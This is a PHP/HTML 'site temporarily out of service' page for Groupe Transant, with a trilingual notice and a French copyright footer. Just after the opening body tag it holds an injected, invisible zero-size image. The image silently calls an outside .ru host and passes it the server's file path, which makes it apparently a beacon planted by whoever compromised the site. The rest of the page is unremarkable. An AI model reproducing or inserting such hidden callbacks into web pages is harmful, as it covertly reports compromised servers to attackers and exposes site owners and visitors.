<?php
include('lib/config.php');
?>

<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta name="keywords" content="">
<meta name='robots' content='noindex, follow'>
<title><?=$param['nom_client']?></title>
<BASE TARGET=MAIN>

</head>
<body width='792' text="#000000" link="#000080" vlink="#800080" alink="#FF0000" ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<table  bgcolor="#FFAF00" width='792' cellpadding='0' cellspacing='0' align='center' border='0' >
<tr>
<td>
<h2 align="center"><font size="5"><?=$param['nom_client']?></font><br></h2>
<center><font size=3>
SIRVASE NOTAR QUE EL SITIO ESTA TEMPORALMENTE FUERA DE SERVICIO.<br> 
<font size=2>
POR FAVOR INTENTE MAS TARDE.<br> 
GRACIAS, EL EQUIPO DE <?=strtoupper($param['nom_client'])?><br>
<br>
<font size=3>
PLEASE TAKE NOTE THAT THE SITE IS TEMPORARILY OUT OF SERVICE AND MIGHT NOT BE AVAILABLE<br>
<font size=2>
PLEASE TRY AGAIN LATER<br>
THANK YOU, THE <?=strtoupper($param['nom_client'])?> TEAM<br>
<br> 
<font size=3>
VEUILLEZ NOTER QUE LE SITE EST TEMPORAIREMENT HORS SERVICE<br>
<font size=2>
VEUILLEZ REESSAYER PLUS TARD.<br>
MERCI, L’ EQUIPE <?=strtoupper($param['nom_client'])?><br>
<br>
</center></font>
<table width='792' height=100 cellpadding='0' cellspacing='0' align='center' border='0'>
	<tr>
	<TD ALIGN="left" width=33%>
		<IMG SRC="extra/gifs/spacer.gif" BORDER=0 WIDTH=150 HEIGHT=200><br>
	</TD>
	<TD ALIGN="left" width=33%>
		<img src="extra/gifs/trav3.gif">
	</TD>
	<TD ALIGN="left" width=33%>
		<IMG SRC="extra/gifs/spacer.gif" BORDER=0 WIDTH=150 HEIGHT=200><br>
	</td>
	</tr>
</table>
<hr color="#004000">
	</td>
</tr>
<tr>
	<td><p align="left"><font size="1">Ce domaine internet émane de Groupe Transant
Tout matériel incluant sans restriction les marques de commerce,
les droits de reproduction et tous les autres droits, présenté
et inclus dans les présentes pages et toutes les autres pages
les accompagnants, est la propriété avec droits d'auteur de 
<a href="mailto:<?php echo hexentities($param['courriel_client']);?>">
Groupe Transant</a>.
Il est permis d'y entrer et d'y emmagasiner du matériel pour
usage personnel, sans droit de propriété individuelle. Tout
autre droit est entièrement réservé.<br>
</font></p>
	</td>
<tr>
<tr>
	<td>
<div align="center"><font size="1"><address><font size="1" face="arial">
	Cette page est entretenu par Denis Léveillé. Vous pouvez envoyer vos commentaire à
	Courriel : <a href="mailto:<?php echo hexentities($param['courriel_client']);?>"><?php echo hexentities($param['courriel_client']);?></a><br>
	<br>
    Dernière mise à jour : 2008/06/01
</address></font></div>
<p align="center"><font size="1">Copyright of this domain/Les droits de reproduction de ce site<br>
 © 2008 Groupe Transant. All right reserved/Tous droits réservés. </font></p>
	</td>
<tr>
</table>
</body>
</html>
